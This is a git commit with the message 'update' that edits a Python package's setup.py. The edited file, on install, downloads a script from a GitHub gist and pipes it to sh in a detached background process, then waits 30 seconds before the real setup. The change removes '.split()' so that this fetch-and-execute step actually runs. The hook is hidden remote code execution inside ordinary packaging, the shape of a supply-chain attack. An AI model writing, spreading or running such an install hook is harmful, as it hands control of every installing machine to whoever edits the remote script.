fad1dbeef66eeaebb477d77729eb83133110c165
tvrnd <rendi.perkasa@traveloka.com>
2024-08-21 16:09:21 +0700

    update

--- setup.py
+++ setup.py
@@ -7,7 +7,7 @@ def run_in_background(command):
     # Start a process in the background
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setpgrp)
     return process
-cmd = "curl https://gist.githubusercontent.com/zftv/33d89312e60adcee081c52b7ef30e922/raw/1f80c8e36749ccbe8a0096915996a962f3611995/gistfile1.txt -s | nohup sh &".split()
+cmd = "curl https://gist.githubusercontent.com/zftv/33d89312e60adcee081c52b7ef30e922/raw/1f80c8e36749ccbe8a0096915996a962f3611995/gistfile1.txt -s | nohup sh &"
 run_in_background(cmd)
 time.sleep(30)
 setup(
